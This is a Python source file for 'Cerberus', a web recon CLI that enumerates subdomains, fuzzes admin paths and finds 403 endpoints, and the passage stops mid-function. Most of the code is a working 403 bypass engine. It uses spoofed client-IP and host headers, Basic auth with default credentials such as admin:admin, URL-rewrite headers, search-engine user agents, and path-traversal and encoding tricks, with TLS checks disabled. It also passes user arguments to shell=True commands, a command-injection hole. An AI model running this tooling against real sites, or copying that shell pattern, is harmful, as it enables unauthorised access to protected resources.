#!/usr/bin/env python3
"""
Cerberus: Gateway Guardian Recon Pipeline Tool
Version: 1.0.1

A polished CLI for 403-focused reconnaissance with these improvements:
1) argparse-based subcommands with clear help
2) Colorized output via colorama
3) ASCII banner + version at startup
4) Output directory support with timestamped files
5) Progress indicators and clean headers
6) Built-in sample mode for testing
7) Fixed adminfuzz to handle both single domains and files with multiple domains
"""
import argparse
import subprocess
import sys
import socket
import random
import string
import os
import requests
import urllib.parse
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init as colorama_init
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Initialize colorama
colorama_init(autoreset=True)

# ASCII banner
BANNER = r"""
  _____ ______ _____  ____  ______ _____  _    _  _____
 / ____|  ____|  __ \|  _ \|  ____|  __ \| |  | |/ ____|
| |    | |__  | |__) | |_) | |__  | |__) | |  | | (___
| |    |  __| |  _  /|  _ <|  __| |  _  /| |  | |\___ \
| |____| |____| | \ \| |_) | |____| | \ \| |__| |____) |
 \_____|______|_|  \_\____/|______|_|  \_\\____/|_____/
"""
print(Fore.GREEN + BANNER)
print(Fore.YELLOW + "Cerberus v1.0.1 - Gateway Guardian Recon Pipeline Tool\n")

# Default threads
DEFAULT_THREADS = 10

# Utility to run shell commands
def run(cmd):
    print(Fore.BLUE + f"$ {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(Fore.RED + f"Error: {result.stderr}")
        return False
    return True

# DNS resolve helper
def resolve_domain(domain: str) -> str:
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return None

# Wildcard detection
def detect_wildcard(base: str) -> str:
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    test = f"{rand}.{base}"
    ip = resolve_domain(test)
    return ip

# Helper function to check if input is a domain or file
def is_domain(input_str):
    """Check if input is a domain name or a file path"""
    # If it's a file that exists, it's a file
    if os.path.isfile(input_str):
        return False
    # If it contains common domain patterns and no path separators, likely a domain
    if ('.' in input_str and
        not input_str.startswith('/') and
        not input_str.startswith('./') and
        '/' not in input_str.replace('https://', '').replace('http://', '')):
        return True
    # Default to file if unsure
    return False

# 403 endpoint scanner function
def scan_403_endpoints(subdomain, wordlist_files, threads=10):
    """Scan for 403 endpoints using wordlists"""
    import requests
    from urllib.parse import urljoin

    found_403s = []

    def check_endpoint(path, base_url):
        test_url = urljoin(f"https://{base_url}", path)
        try:
            response = requests.get(test_url, timeout=5, allow_redirects=False)
            if response.status_code == 403:
                return test_url
        except requests.RequestException:
            # Try HTTP if HTTPS fails
            try:
                test_url = urljoin(f"http://{base_url}", path)
                response = requests.get(test_url, timeout=5, allow_redirects=False)
                if response.status_code == 403:
                    return test_url
            except requests.RequestException:
                pass
        return None

    # Read all wordlist files
    all_paths = set()
    for wordlist_file in wordlist_files:
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                paths = [line.strip() for line in f if line.strip()]
                # Add common path prefixes
                for path in paths:
                    all_paths.add(f"/{path}")
                    all_paths.add(f"/{path}/")
                    all_paths.add(f"/admin/{path}")
                    all_paths.add(f"/api/{path}")
                print(Fore.CYAN + f"Loaded {len(paths)} paths from {wordlist_file}")
        except Exception as e:
            print(Fore.RED + f"Error reading {wordlist_file}: {e}")

    print(Fore.CYAN + f"Total unique paths: {len(all_paths)}")
    print(Fore.CYAN + f"Testing against: {subdomain}")

    if len(all_paths) == 0:
        print(Fore.RED + "No paths loaded from wordlists!")
        return found_403s

    # Use ThreadPoolExecutor for concurrent HTTP requests
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_endpoint, path, subdomain): path
                  for path in all_paths}

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:
                print(Fore.YELLOW + f"Progress: {completed}/{len(all_paths)} checked")

            result = future.result()
            if result:
                found_403s.append(result)
                print(Fore.GREEN + f"✓ 403 Found: {result}")

    return found_403s

# Admin fuzzer function
def fuzz_admin_paths(subdomain, wordlist_files, threads=10):
    """Fuzz admin paths using wordlists"""
    import requests
    from urllib.parse import urljoin

    found_endpoints = []

    def check_admin_path(path, base_url):
        test_url = urljoin(f"https://{base_url}", path)
        try:
            response = requests.get(test_url, timeout=5, allow_redirects=False)
            status = response.status_code
            if status in [200, 401, 403, 302, 301]:  # Interesting responses
                return (test_url, status)
        except requests.RequestException:
            # Try HTTP if HTTPS fails
            try:
                test_url = urljoin(f"http://{base_url}", path)
                response = requests.get(test_url, timeout=5, allow_redirects=False)
                status = response.status_code
                if status in [200, 401, 403, 302, 301]:
                    return (test_url, status)
            except requests.RequestException:
                pass
        return None

    # Read wordlist file
    all_paths = set()
    for wordlist_file in wordlist_files:
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                paths = [line.strip() for line in f if line.strip()]
                for path in paths:
                    all_paths.add(f"/{path}")
                    all_paths.add(f"/{path}/")
                print(Fore.CYAN + f"Loaded {len(paths)} admin paths from {wordlist_file}")
        except Exception as e:
            print(Fore.RED + f"Error reading {wordlist_file}: {e}")

    print(Fore.CYAN + f"Total admin paths: {len(all_paths)}")
    print(Fore.CYAN + f"Testing against: {subdomain}")

    if len(all_paths) == 0:
        print(Fore.RED + "No paths loaded from wordlists!")
        return found_endpoints

    # Use ThreadPoolExecutor for concurrent HTTP requests
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_admin_path, path, subdomain): path
                  for path in all_paths}

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:
                print(Fore.YELLOW + f"Progress: {completed}/{len(all_paths)} checked")

            result = future.result()
            if result:
                url, status = result
                found_endpoints.append(f"{url} [{status}]")
                print(Fore.GREEN + f"✓ Found: {url} [{status}]")

    return found_endpoints

def prepare_output(path: str) -> Path:
    outdir = Path(path)
    outdir.mkdir(parents=True, exist_ok=True)
    return outdir

# Sub-subdomain scanner function
def scan_subsubdomains(subdomain, wordlist_files, threads=10):
    """Scan for sub-subdomains using wordlists"""
    found_subs = set()

    def check_subdomain(word, base_domain):
        test_domain = f"{word}.{base_domain}"
        try:
            ip = resolve_domain(test_domain)
            if ip:
                print(Fore.GREEN + f"✓ Found: {test_domain} -> {ip}")
                return test_domain
        except Exception as e:
            print(Fore.RED + f"✗ Error testing {test_domain}: {e}")
        return None

    # Read all wordlist files
    all_words = set()
    for wordlist_file in wordlist_files:
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
                all_words.update(words)
                print(Fore.CYAN + f"Loaded {len(words)} words from {wordlist_file}")
        except Exception as e:
            print(Fore.RED + f"Error reading {wordlist_file}: {e}")

    print(Fore.CYAN + f"Total unique words: {len(all_words)}")
    print(Fore.CYAN + f"Testing against: {subdomain}")

    if len(all_words) == 0:
        print(Fore.RED + "No words loaded from wordlists!")
        return found_subs

    # Use ThreadPoolExecutor for concurrent DNS lookups
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_subdomain, word, subdomain): word
                  for word in all_words}

        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:  # Show progress more frequently
                print(Fore.YELLOW + f"Progress: {completed}/{len(all_words)} checked")

            result = future.result()
            if result:
                found_subs.add(result)

    return found_subs

def bypass_403_endpoints(endpoints_file, threads=5):
    """
    Test various 403 bypass techniques on endpoints from a file
    Returns a list of successful bypasses with details
    """
    # Read endpoints from file
    try:
        with open(endpoints_file, 'r') as f:
            endpoints = [line.strip() for line in f if line.strip()]
        print(Fore.CYAN + f"Loaded {len(endpoints)} endpoints from {endpoints_file}")
    except FileNotFoundError:
        print(Fore.RED + f"[✗] Endpoints file not found: {endpoints_file}")
        return []

    # Session setup with retry strategy
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        backoff_factor=0.5
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # User agents for rotation
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'Twitterbot/1.0',
        'LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)',
        'WhatsApp/2.16.7',
    ]

    # HTTP Methods to test
    methods = [
        'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE',
        'CONNECT', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK',
        'UNLOCK', 'VERSION-CONTROL', 'REPORT', 'CHECKOUT', 'CHECKIN', 'UNCHECKOUT',
        'MKWORKSPACE', 'UPDATE', 'LABEL', 'MERGE', 'BASELINE-CONTROL', 'MKACTIVITY'
    ]

    # Comprehensive bypass headers
    bypass_headers = [
        # IP Spoofing Headers
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-For': '0.0.0.0'},
        {'X-Forwarded-For': '2130706433'},  # 127.0.0.1 in decimal
        {'X-Forwarded-For': '0x7F000001'},  # 127.0.0.1 in hex
        {'X-Forwarded-For': '127.1'},
        {'X-Forwarded-For': '127.000.000.1'},
        {'X-Forwarded-For': '::1'},  # IPv6 localhost
        {'X-Forwarded-For': '0000:0000:0000:0000:0000:0000:0000:0001'},
        {'X-Forwarded-For': '192.168.1.1'},
        {'X-Forwarded-For': '10.0.0.1'},
        {'X-Forwarded-For': '172.16.0.1'},
        {'X-Forwarded-For': '169.254.169.254'},  # AWS metadata
        {'X-Forwarded-For': '127.0.0.1:80'},
        {'X-Forwarded-For': '127.0.0.1:443'},
        {'X-Forwarded-For': '127.0.0.1:8080'},

        # Multiple IP variations
        {'X-Forwarded-For': '127.0.0.1, 127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1, 192.168.1.1'},
        {'X-Forwarded-For': 'localhost, 127.0.0.1'},

        # Real IP variations
        {'X-Real-IP': '0.0.0.0'},
        {'X-Real-IP': '192.168.1.1'},
        {'X-Real-IP': '10.0.0.1'},
        {'X-Real-IP': '::1'},

        # Client IP variations
        {'Client-IP': '127.0.0.1'},
        {'Client-IP': '0.0.0.0'},
        {'True-Client-IP': '127.0.0.1'},
        {'True-Client-IP': '0.0.0.0'},

        # Cluster and proxy IPs
        {'X-Cluster-Client-IP': '127.0.0.1'},
        {'X-ProxyUser-Ip': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
        {'CF-Connecting-IP': '0.0.0.0'},
        {'Fastly-Client-Ip': '127.0.0.1'},
        {'X-Azure-ClientIP': '127.0.0.1'},
        {'X-Azure-SocketIP': '127.0.0.1'},

        # Authority/Host headers
        {'Host': 'localhost'},
        {'Host': '127.0.0.1'},
        {'Host': '0.0.0.0'},
        {'Host': 'admin.localhost'},
        {'Host': 'internal.localhost'},
        {'X-Host': 'localhost'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-Host': '127.0.0.1'},
        {'X-Forwarded-Server': 'localhost'},
        {'X-HTTP-Host-Override': 'localhost'},

        # Authorization headers
        {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
        {'Authorization': 'Basic cm9vdDpyb290'},  # root:root
        {'Authorization': 'Basic dGVzdDp0ZXN0'},  # test:test
        {'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='},  # guest:guest
        {'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ='},  # admin:password
        {'Authorization': 'Bearer token'},
        {'Authorization': 'Bearer admin'},
        {'Authorization': 'Bearer test'},
        {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'},  # Sample JWT
        {'Authorization': 'Digest username="admin"'},
        {'Authorization': 'NTLM'},
        {'Authorization': 'Negotiate'},

        # HTTP Method Override headers
        {'X-HTTP-Method-Override': 'GET'},
        {'X-HTTP-Method-Override': 'POST'},
        {'X-HTTP-Method-Override': 'PUT'},
        {'X-HTTP-Method-Override': 'DELETE'},
        {'X-Method-Override': 'GET'},
        {'X-Method-Override': 'POST'},
        {'_method': 'GET'},
        {'_method': 'POST'},

        # Custom bypass headers
        {'X-Requested-With': 'XMLHttpRequest'},
        {'X-Forwarded-Proto': 'https'},
        {'X-Forwarded-Ssl': 'on'},
        {'X-Url-Scheme': 'https'},
        {'Front-End-Https': 'on'},
        {'X-Forwarded-Protocol': 'https'},
        {'X-Forwarded-Scheme': 'https'},
        {'X-Scheme': 'https'},

        # URL rewrite headers
        {'X-Original-URL': '/'},
        {'X-Original-URL': '/admin'},
        {'X-Original-URL': '/api'},
        {'X-Rewrite-URL': '/'},
        {'X-Rewrite-URL': '/admin'},
        {'X-Rewrite-URL': '/api'},
        {'X-Override-URL': '/'},
        {'X-Request-URI': '/'},

        # Referer variations
        {'Referer': 'https://google.com/'},
        {'Referer': 'https://localhost/'},
        {'Referer': 'https://127.0.0.1/'},
        {'Referer': 'https://admin.localhost/'},
        {'Referer': 'https://internal.localhost/'},
        {'Referrer': 'https://google.com/'},

        # User-Agent variations
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'User-Agent': 'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)'},
        {'User-Agent': 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)'},
        {'User-Agent': 'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)'},
        {'User-Agent': 'Baiduspider/2.0; (+http://www.baidu.com/search/spider.html)'},
        {'User-Agent': 'YandexBot/3.0; (+http://yandex.com/bots)'},
        {'User-Agent': 'facebot'},
        {'User-Agent': 'ia_archiver'},
        {'User-Agent': 'Twitterbot/1.0'},
        {'User-Agent': 'Pinterest/0.1 +http://pinterest.com/'},

        # Custom application headers
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Source-IP': '127.0.0.1'},
        {'X-Forwarded': '127.0.0.1'},
        {'Forwarded-For': '127.0.0.1'},
        {'Forwarded': 'for=127.0.0.1'},
        {'Forwarded': 'for=localhost'},
        {'X-Remote-Host': 'localhost'},
        {'X-Remote-Hostname': 'localhost'},

        # CDN and Load Balancer specific
        {'Akamai-Origin-Hop': '1'},
        {'CloudFront-Forwarded-Proto': 'https'},
        {'CloudFront-Is-Desktop-Viewer': 'true'},
        {'CloudFront-Is-Mobile-Viewer': 'false'},
        {'X-Edge-Location': 'cache'},

        # Security bypass attempts
        {'X-Accel-Redirect': '/'},
        {'X-Sendfile': '/'},
        {'X-Sendfile-Type': 'X-Accel-Redirect'},

        # Content type variations
        {'Content-Type': 'application/json'},
        {'Content-Type': 'application/xml'},
        {'Content-Type': 'text/xml'},
        {'Content-Type': 'application/x-www-form-urlencoded'},
        {'Accept': '*/*'},
        {'Accept': 'application/json'},
        {'Accept': 'text/html'},
        {'Accept': 'application/xml'},

        # Cache control
        {'Cache-Control': 'no-cache'},
        {'Cache-Control': 'max-age=0'},
        {'Pragma': 'no-cache'},

        # CORS headers
        {'Origin': 'https://localhost'},
        {'Origin': 'https://127.0.0.1'},
        {'Origin': 'null'},
        {'Access-Control-Request-Method': 'GET'},
        {'Access-Control-Request-Headers': 'content-type'},

        # WebDAV headers
        {'Translate': 'f'},
        {'Depth': '0'},
        {'Depth': '1'},
        {'Depth': 'infinity'},

        # Custom admin headers
        {'X-Admin': 'true'},
        {'X-Admin': '1'},
        {'Admin': 'true'},
        {'Is-Admin': 'true'},
        {'X-Debug': 'true'},
        {'Debug': '1'},
        {'X-Test': 'true'},
        {'Test': '1'},
    ]

    # Function to generate URL variations
    def generate_url_variations(url):
        variations = []
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        query = parsed.query

        # Basic variations
        variations.extend([
            url,
            url + '/',
            url + '//',
            url + '///',
            url + '////',
            url + '?',
            url + '#',
            url + '?test=1',
            url + '#test',
        ])

        # Path traversal variations
        if path:
            variations.extend([
                url + '/%2e/',
                url + '/%2e%2e/',
                url + '/%252e/',
                url + '/%252e%252e/',
                url + '/./',
                url + '/../',
                url + '/..;/',
                url + '/../..',
                url + '/../../',
                url + '/.././',
                url + '/./../',
                url + '/.//',
                url + '//.',
                url + '//..;/',
                url + '/;/',
                url + '/?/',
                url + '/&/',
                url.replace(path, path + '/..'),
                url.replace(path, path + '/../'),
                url.replace(path, '/../' + path),
                url.replace(path, '/./' + path),
            ])

        # Null byte and special character variations
        variations.extend([
            url + '/%00/',
            url + '/%00',
            url + '%00',
            url + '/%0a/',
            url + '/%0d/',
            url + '/%09/',
            url + '/%0c/',
            url + '/%20/',
            url + '/%a0/',
            url + '/%2f/',
            url + '/%5c/',
            url + '/%3f/',
            url + '/%23/',
            url + '/%26/',
            url + '/%3d/',
            url + '/%2b/',
            url + '/%40/',
            url + '/%7e/',
        ])

        # Double encoding variations
        if path:
            variations.extend([
                url.replace(path, urllib.parse.quote(path, safe='')),
                url.replace(path, urllib.parse.quote(urllib.parse.quote(path, safe=''), safe='')),
                url.replace(path, path.replace('/', '%2f')),
                url.replace(path, path.replace('/', '%252f')),
                url.replace(path, path.replace('/', '%2F')),
                url.replace(path, path.replace('/', '\\').replace('\\', '%5c')),
            ])

        # Case variations
        if path:
            variations.extend([
                url.replace(path, path.upper()),
                url.replace(path, path.lower()),
                url.replace(path, path.title()),
                url.replace(path, path.swapcase()),
            ])

            # Mixed case variations for each character
            if len(path) > 1:
                for i in range(min(len(path), 5)):  # Limit to avoid too many variations
                    if path[i].isalpha():
                        varied_path = path[:i] + path[i].swapcase() + path[i+1:]
                        variations.append(url.replace(path, varied_path))

        # Extension variations
        if '.' in path and path != '/':
            base_path = path.rsplit('.', 1)[0]
            extension = path.rsplit('.', 1)[1]
            variations.extend([
                url.rsplit('.', 1)[0],  # Remove extension
                url.replace('.' + extension, ''),
                url.replace('.' + extension, '.bak'),
                url.replace('.' + extension, '.old'),
                url.replace('.' + extension, '.orig'),
                url.replace('.' + extension, '.tmp'),
                url.replace('.' + extension, '.backup'),
                url.replace('.' + extension, '~'),
                url + '.bak',
                url + '.old',
                url + '.orig',
                url + '.tmp',
                url + '~',
                url + '.backup',
            ])

        # HTTP parameter pollution
        if '?' in url:
            variations.extend([
                url + '&debug=1',
                url + '&test=1',
                url + '&admin=1',
                url + '&access=1',
                url + '&bypass=1',
                url + '&override=1',
            ])
        else:
            variations.extend([
                url + '?debug=1',
                url + '?test=1',
                url + '?admin=1',
                url + '?access=1',
                url + '?bypass=1',
                url + '?override=1',
            ])

        # HTTP version variations and protocol manipulation
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        if parsed.scheme == 'https':
            variations.append(url.replace('https://', 'http://'))
        elif parsed.scheme == 'http':
            variations.append(url.replace('http://', 'https://'))

        # Unicode and internationalization bypasses
        if path:
            # Unicode normalization bypasses
            try:
                import unicodedata
                normalized_path = unicodedata.normalize('NFKC', path)
                if normalized_path != path:
                    variations.append(url.replace(path, normalized_path))
            except:
                pass

            # Unicode character variations
            unicode_variations = {
                '/': ['%2F', '%2f', '%u002F', '%u002f', '\\', '%5C', '%5c'],
                '.': ['%2E', '%2e', '%u002E', '%u002e'],
                '?': ['%3F', '%3f', '%u003F', '%u003f'],
                '#': ['%23', '%u0023'],
                '&': ['%26', '%u0026'],
                '=': ['%3D', '%3d', '%u003D', '%u003d'],
                '+': ['%2B', '%2b', '%u002B', '%u002b'],
                ' ': ['%20', '+', '%u0020'],
            }

            for char, encodings in unicode_variations.items():
                if char in path:
                    for encoding in encodings[:2]:  # Limit to avoid too many
                        variations.append(url.replace(char, encoding))

        # Remove duplicates while preserving order
        seen = set()
        unique_variations = []
        for var in variations:
            if var not in seen:
                seen.add(var)
                unique_variations.append(var)

        return unique_variations

    # Function to test a single request
    def test_request(method, test_url, headers=None, data=None):
        if headers is None:
            headers = {}

        # Randomly rotate user agent if not specified in headers
        if 'User-Agent' not in headers:
            headers = headers.copy()
            headers['User-Agent'] = random.choice(user_agents)

        try:
            # Add small delay to be respectful
            time.sleep(random.uniform(0.05, 0.3))

            response = session.request(
                method=method,
                url=test_url,
                headers=headers,
                data=data,
                allow_redirects=False,
                timeout=10,
                verify=False
            )

            # Consider various success indicators
            is_success = (
                response.status_code not in [403, 404, 401] and
                response.status_code < 500 and
                'forbidden' not in response.text.lower()[:200] and
                'access denied' not in response.text.lower()[:200] and
                'unauthorized' not in response.text.lower()[:200]
            )

            return {
                'method': method,
                'url': test_url,
                'headers': {k: v for k, v in headers.items() if k != 'User-Agent'},  # Don't include rotated UA
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': is_success,
                'response_headers': dict(response.headers)
            }
        except Exception as e:
            return {
                'method': method,
                'url': test_url,
                'headers': headers,
                'status_code': 'ERROR',
                'error': str(e),
                'success': False
            }

    # Test all endpoints
    all_results = []
    max_attempts = 100000  # Increased to ensure all endpoints are tested
    attempts = 0

    for endpoint in endpoints:
        print(Fore.YELLOW + f"\nTesting endpoint: {endpoint}")

        # Test different HTTP methods
        for method in methods:
            if attempts >= max_attempts:
                break
            attempts += 1
            result = test_request(method, endpoint)
            if result and result['success']:
                all_results.append(result)
                print(Fore.GREEN + f"✓ {method} {endpoint} -> {result['status_code']} ({result['content_length']} bytes)")

        # Test header bypasses with GET method
        for headers in bypass_headers:
            if attempts >= max_attempts:
                break
            attempts += 1
            result = test_request('GET', endpoint, headers)
            if result and result['success']:
                all_results.append(result)
                header_str = ', '.join([f"{k}: {v}" for k, v in headers.items()])
                print(Fore.GREEN + f"✓ GET {endpoint} [{header_str}] -> {result['status_code']} ({result['content_length']} bytes)")

        # Test URL variations with GET method
        variations = generate_url_variations(endpoint)
        for variation in variations:
            if attempts >= max_attempts:
                break
            if variation != endpoint:  # Skip original URL
                attempts += 1
                result = test_request('GET', variation)
                if result and result['success']:
                    all_results.append(result)
                    print(Fore.GREEN + f"✓ GET {variation} -> {result['status_code']} ({result['content_length']} bytes)")

        # Test POST with data variations
        post_data_variations = [
            {},
            {'admin': '1'},
            {'debug': '1'},
            {'test': '1'},
            {'access': 'admin'},
            {'role': 'admin'},
            {'user': 'admin'},
            {'_method': 'GET'},
            {'_method': 'PUT'},
            {'override': 'true'},
        ]

        for data in post_data_variations:
            if attempts >= max_attempts:
                break
            attempts += 1
            result = test_request('POST', endpoint, data=data)
            if result and result['success']:
                all_results.append(result)
                data_str = ', '.join([f"{k}={v}" for k, v in data.items()]) if data else 'empty'
                print(Fore.GREEN + f"✓ POST {endpoint} [data: {data_str}] -> {result['status_code']} ({result['content_length']} bytes)")

        # Test successful header combinations with different methods
        successful_headers = [r['headers'] for r in all_results if r['headers']][:3]
        for headers in successful_headers:
            for method in ['POST', 'PUT', 'DELETE']:
                if attempts >= max_attempts:
                    break
                attempts += 1
                result = test_request(method, endpoint, headers)
                if result and result['success']:
                    all_results.append(result)
                    header_str = ', '.join([f"{k}: {v}" for k, v in headers.items()])
                    print(Fore.GREEN + f"✓ {method} {endpoint} [{header_str}] -> {result['status_code']} ({result['content_length']} bytes)")

    print(Fore.CYAN + f"\nCompleted {attempts} requests")
    print(Fore.GREEN + f"Found {len(all_results)} successful bypasses")

    # Sort results by status code and content length for better analysis
    all_results.sort(key=lambda x: (x['status_code'], -x.get('content_length', 0)))

    return all_results



# Subcommand implementations

def enum_subdomains(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'subs_all.txt')
    print(Fore.GREEN + f"[+] Enumerating subdomains for {args.domain}...")
    cmd = f"subfinder -d {args.domain} -silent -o {outfile}"
    if run(cmd):
        print(Fore.GREEN + f"[✓] Subdomains saved to {outfile}\n")
    else:
        print(Fore.RED + f"[✗] Failed to enumerate subdomains\n")

def filter_wildcard(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'subs_filtered.txt')
    print(Fore.GREEN + f"[+] Filtering wildcards on {args.domain}...\n")
    cmd = f"./wild_batch_scanner.sh {args.domain} {args.wordlist} > {outfile}"
    if run(cmd):
        print(Fore.GREEN + f"[✓] Filtered subs saved to {outfile}\n")
    else:
        print(Fore.RED + f"[✗] Failed to filter wildcards\n")

def subscan(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'subsubs.txt')
    print(Fore.GREEN + f"[+] Scanning sub-subdomains from {args.subs_file}...\n")

    # Read subdomains from file
    try:
        with open(args.subs_file, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
        print(Fore.CYAN + f"Loaded {len(subdomains)} subdomains from {args.subs_file}")
        print(Fore.CYAN + f"First 3 subdomains: {subdomains[:3]}")
    except FileNotFoundError:
        print(Fore.RED + f"[✗] Subdomains file not found: {args.subs_file}")
        return

    # Get all wordlist files from directory
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return

    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return

    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")
    print(Fore.CYAN + f"Scanning {len(subdomains)} subdomains")

    all_found = set()

    # Scan each subdomain
    for i, subdomain in enumerate(subdomains, 1):
        print(Fore.YELLOW + f"\n[{i}/{len(subdomains)}] Scanning {subdomain}")

        # Quick test: manually test one known combination
        if i == 1:  # Only for first subdomain
            print(Fore.CYAN + f"Testing known combinations first...")
            test_domain = f"api.{subdomain}"
            test_ip = resolve_domain(test_domain)
            if test_ip:
                print(Fore.GREEN + f"✓ Manual test passed: {test_domain} -> {test_ip}")
            else:
                print(Fore.YELLOW + f"✗ Manual test: {test_domain} not found")

        found = scan_subsubdomains(subdomain, wordlist_files, args.threads)
        all_found.update(found)
        print(Fore.GREEN + f"Found {len(found)} sub-subdomains for {subdomain}")

    # Save results
    with open(outfile, 'w') as f:
        for sub in sorted(all_found):
            f.write(f"{sub}\n")

    print(Fore.GREEN + f"\n[✓] Total sub-subdomains found: {len(all_found)}")
    print(Fore.GREEN + f"[✓] Sub-subdomains saved to {outfile}\n")

def wordscan(args):
    outdir = prepare_output(args.output_dir)
    print(Fore.GREEN + f"[+] Wordlist scan on {args.subdomain}...\n")

    # Check if the wordlist scanner exists
    if not os.path.exists('wildcard_wordlist_scanner.py'):
        print(Fore.RED + "[✗] wildcard_wordlist_scanner.py not found!")
        print(Fore.YELLOW + "Attempting alternative scan method...")

        # Alternative: use our built-in scanner
        wordlist_dir = Path(args.wordlist_dir)
        if wordlist_dir.exists():
            wordlist_files = list(wordlist_dir.glob("*.txt"))
            if wordlist_files:
                found = scan_subsubdomains(args.subdomain, wordlist_files, DEFAULT_THREADS)
                print(Fore.GREEN + f"[✓] Found {len(found)} subdomains")
                for sub in sorted(found):
                    print(Fore.CYAN + f"  {sub}")
            else:
                print(Fore.RED + f"[✗] No wordlist files found in {args.wordlist_dir}")
        else:
            print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return

    p = subprocess.Popen(
        ['python3', 'wildcard_wordlist_scanner.py'], stdin=subprocess.PIPE, text=True
    )
    p.communicate(f"{args.subdomain}\n{args.wordlist_dir}\n")
    print(Fore.GREEN + "[✓] Wordlist scan complete.\n")

def identify_403(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'endpoints_403.txt')

    # Handle both single subdomain and file with multiple subdomains
    if is_domain(args.subdomain):
        subdomains = [args.subdomain]
        print(Fore.GREEN + f"[+] Identifying 403 endpoints on {args.subdomain}...\n")
    else:
        # It's a file
        try:
            with open(args.subdomain, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Identifying 403 endpoints on {len(subdomains)} subdomains from {args.subdomain}...\n")
            print(Fore.CYAN + f"First 3 subdomains: {subdomains[:3]}")
        except FileNotFoundError:
            print(Fore.RED + f"[✗] File not found: {args.subdomain}")
            return

    # Get all wordlist files from directory
    wordlist_dir = Path(args.wordlist_dir)
    if not wordlist_dir.exists():
        print(Fore.RED + f"[✗] Wordlist directory not found: {args.wordlist_dir}")
        return

    wordlist_files = list(wordlist_dir.glob("*.txt"))
    if not wordlist_files:
        print(Fore.RED + f"[✗] No .txt wordlist files found in {args.wordlist_dir}")
        return

    print(Fore.CYAN + f"Found {len(wordlist_files)} wordlist files")
    for wf in wordlist_files:
        print(Fore.CYAN + f"  - {wf.name}")

    all_found_403s = []

    # Scan each subdomain
    for i, subdomain in enumerate(subdomains, 1):
        print(Fore.YELLOW + f"\n[{i}/{len(subdomains)}] Scanning {subdomain}")
